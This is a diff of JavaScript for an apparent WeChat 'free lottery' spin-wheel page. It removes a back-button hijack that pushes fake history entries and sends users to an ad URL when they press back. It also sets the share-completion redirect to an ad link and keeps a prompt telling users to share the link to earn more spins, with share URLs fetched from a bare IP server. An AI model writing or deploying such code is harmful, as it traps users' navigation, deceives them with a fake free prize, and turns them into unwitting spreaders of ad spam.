@@ -53,26 +53,26 @@ var turnplate={
 //setTimeout(function() { console.log(storeWithExpiration.get('mobile')); }, 500); // -> "bar"
 
 var currentTime = new Date().getTime();
-window.setTimeout(
-    function () {
-        history.pushState(null, null, "#weixin");
-        window.onpopstate = function () {
-            history.pushState(null, null, "#weixin2");
-            var currentTime2 = new Date().getTime();
-            if (currentTime2 - currentTime < 500) {
-                return true;
-            }
-            lastBackIndex++;
-            if (lastBackIndex % 2 == 0 && typeof(adUrl) != "undefined") {
-                location.href = adUrl;
-            } else {
-                selfLoad();
-            }
-            return true;
-        };
-    }, 50);
+// window.setTimeout(
+//     function () {
+//         history.pushState(null, null, "#weixin");
+//         window.onpopstate = function () {
+//             history.pushState(null, null, "#weixin2");
+//             var currentTime2 = new Date().getTime();
+//             if (currentTime2 - currentTime < 500) {
+//                 return true;
+//             }
+//             lastBackIndex++;
+//             if (lastBackIndex % 2 == 0 && typeof(adUrl) != "undefined") {
+//                 location.href = adUrl;
+//             } else {
+//                 selfLoad();
+//             }
+//             return true;
+//         };
+//     }, 50);
 
-//分流                                       n
+//分流                                       
 function fenliu() {
     //有5分之一的几率切到新的上面
     var time = new Date().getTime();
@@ -128,23 +128,23 @@ function wxAlert(msg, callback) {
 
 //是否是新版的微信
 function isWxNewVersion() {
-    // if (isDev) {
-    //     return true;
-    // }
-    // if ((/carlos1/i).test(window.location.href)) {
-    //     return false;
-    // }
+    if (isDev) {
+        return true;
+    }
+    if ((/carlos1/i).test(window.location.href)) {
+        return false;
+    }
 
-    // if ((/carlos2/i).test(window.location.href)) {
-    //     return true;
-    // }
+    if ((/carlos2/i).test(window.location.href)) {
+        return true;
+    }
 
-    // var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
-    // if (!wechatInfo) {
-    //     return false;
-    // }
-    // console.log(wechatInfo[1]);
-    // return wechatInfo.length > 1 && wechatInfo[1] == "6.3.23";
+    var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
+    if (!wechatInfo) {
+        return false;
+    }
+    console.log(wechatInfo[1]);
+    return wechatInfo.length > 1 && wechatInfo[1] == "6.3.23";
 }
 
 
@@ -342,15 +342,15 @@ function shareComplete() {
     }
 }
 
+//分享出去的广告链接
 function goToShareNexUrlnew() {
-   // window.location.href = "http://dm9911.com/?do=bW9iaWxlZGV0YWlsXzM3NV8yMTY1OV8wODI5MTkzOTMy";
-   window.location.href = "http://renamayu.github.io/test/skip.html";
+   window.location.href = "http://dm9911.com/?do=bW9iaWxlZGV0YWlsXzM3NV8yMTY1OV8wODI5MTkzOTMy";
 }
 
 
+//获取链接
 var shareUrl = window.location.href;
 function getNewShareUrl() {
-     // window.location.href = "http://renamayu.github.io/test/skip.html";
     var shareGetUrl = "http://119.29.8.160:8800/index1";
     $.ajax({
         type: "GET",
@@ -361,6 +361,7 @@ function getNewShareUrl() {
     });
 }
 
+//分享的展示
 var currentShareObject = {
     title: "免费抽奖",
     desc: "每天免费领",
@@ -548,7 +549,8 @@ $(document).ready(function(){
             }
             
             if(playnum <= 0) { //当抽奖次数为0的时候执行
-                    alert("没有次数了,可通过分享链接获取抽奖次数");alert(share);
+                    alert("没有次数了,可通过分享链接获取抽奖次数");
+                    //alert(share);
                     $('.playnum').html(0);
                     return false;
                 } else { //还有次数就执行
